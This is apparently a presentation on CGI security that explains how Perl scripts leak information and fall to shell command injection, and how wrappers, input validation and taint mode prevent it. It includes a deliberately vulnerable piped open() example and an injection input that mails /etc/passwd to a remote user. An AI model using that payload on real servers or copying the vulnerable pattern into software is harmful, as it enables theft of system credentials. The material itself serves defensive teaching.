###### Thanks to irt.org Pankaj Kamthan
###### Published on 19 September 1999
###### https://www.irt.org/articles/js184/index.html

# Common Gateway Interface(CGI) Security: Better Safe than Sorry
### Presented by: Jared Knutson

## Introduction
CGI is the first and remains one of the most widely-used means of extending Web servers by interfacing external applications.

CGI interfaces can compromise a Web server's security ala the host running it.


## Questions

- What type of potential CGI security problems exist? 
- How do they arise? 
- What can be the consequences of these problems? 
- How, and to what extent, can these problems be eliminated?

## Origins

1. The User. A person including an intruder (such as a hacker, masquerader, counterfeiter, an eavesdropper) or a program (such as a virus).
2. HTML form or searchable index.
3. HTTP and CGI protocols.
4. The CGI script.
5. Compiler/interpreter that runs the CGI script (which depends on the language the script is written in).
6. External data (that comes from the user in 1. above).
7. External programs that the script calls.
8. Client-side techniques, such as JavaScript, used in conjunction with the CGI.
9. The Web browser.
10. The Web server.

## Figure

![alt text][figure1]

[figure1]: file:///Users/drednaut/Desktop/cgi_figure.gif
Figure 1. CGI Communication between the Web Client and Server.

## CGI Security Holes

1. Unintentionally leaking information about the host system.
2. Forms which use user input may be vulnerable to Remote Code Execution(RCE).

## Motives for Attacking CGI

- Critial files containing sensitive information.
- Content sold to competitor.
- Information about the host machine is obtained allowing unauth'd users access to the system.
- Unauth'd users use RCE to modify files on the server.
- The site is used to launch attacks against other sites.

## Server-Side Configuration for CGI Scripts

- Do not generate dynamically produced indecies.
- Keep all .cgi scripts contained in the cgi-bin directory.
- Do not serve any other document besides \*.cgi from within the cgi-bin directory tree.

## CGI Script Privileges

## 007 can not be Trusted

- Make sure scripts only have the required permissions
- Use ```chmod``` to set the correct permissions in a UNIX system.
- Do not let others write to the server.

## "Nobody" can be a Threat to Everybody

- A subverted CGI script running as "nobody" still has enough privileges to mail out the system password file
- A buggy CGI script can leak sufficient system information to compromise the host.

## CGI Scripts with Extra Privileges

- Only where absolutely required let a script run as suid.
- Avoid "setuid root".

## CGI Wrappers

- CGI scripts can be made safe by placing them inside a CGI "wrapper" script.
- There are 3 major wrappers in UNIX:
    - CGIwrap
    - SBOX
    - suEXEC

## HTML Forms and the Script

### Sanity Checks

- You should perform sanity checks, such as, all HTML form elements should return values.

### Script Invocation

- Use the ```HTTP REFERER``` environment variable, which provides the url of the document that the browser points to before accessing the CGI script.

### Hidden Variables

- Hidden variables should not be relied upon for security.
- Can be seen in the source code.

## CGI Scripts Calling External Programs

### Information (Over)exposure

- Some UNIX commands should never be used in a CGI script because they tend to leak information about the server to the user.
- These commands include, but are not limited to:
    - finger
    - w
    - ps

### Backtick Quotes

Backtick quotes (`...`), are used in Perl for capturing the output of programs as text strings, and are dangerous.

```print `/path_to/finger $input ('user_input')`;```

expects the input to be somebody's username, but may not be the case.

### Calling Shell Commands eval(), exec(), system()

These commands can do alot of damage.

For example, here is a Perl script that tries to send mail to an address indicated in a fill-out form:

```perl
$mail_to = $get_input; # read the address from form
open(MAIL,"| /path_to/sendmail $mail_to");
print MAIL "To: $mail_to\nFrom: somebody\n\n Hello\n";
close MAIL;
```
The problem is in the piped ```open()``` call. The script author assumed that the contents of the ```$mail_to``` variable will always be just an e-mail address.

However if the following is entered:

```
nobody@nowhere;mail somebody@somewhere</etc/passwd;
```

Unintentionally, ```open()``` has mailed the contents of the system password file to the remote user, opening the host to a password cracking attack.

This can be avoided using the ```-t``` flag to ignore the address given on the command line and take the To: address from the email handler.

### Exposing External Data to the Shell

An example of this is:

```perl
system ("/path_to/finger $user_input");
```

The problem is that any shell metacharacters can ber passed through it. The ist of shell metacharacters is extensive:

```
&;`'/"|*?~<>^()[]{}$\n\r
```

You should always scan arguments for shell metacharacters and remove them.

This can be done using regular expressions

The mail script can be changed to the following to only allow valid email address format.

```perl
$mail_to = $get_name_from_input;
unless ($mail_to =~ /^[\w.+-]+\@[\w.+-]+$/) {
    die 'The address is not in form eistein@irt.org';
}
```

### Tainting

- Tainting is when an unchecked user supplied variable is passed to the command line.
    - Data from outside of the script
    - Environment variables
    - Command line array
    - Variables from standard input

In Perl 5 the ```-T``` flag can be used to check for tainted variables, and will not let it affect processes inside of the script.

Which can be enabled in the script by doing the following.

```#!/usr/local/bin/perl -T```

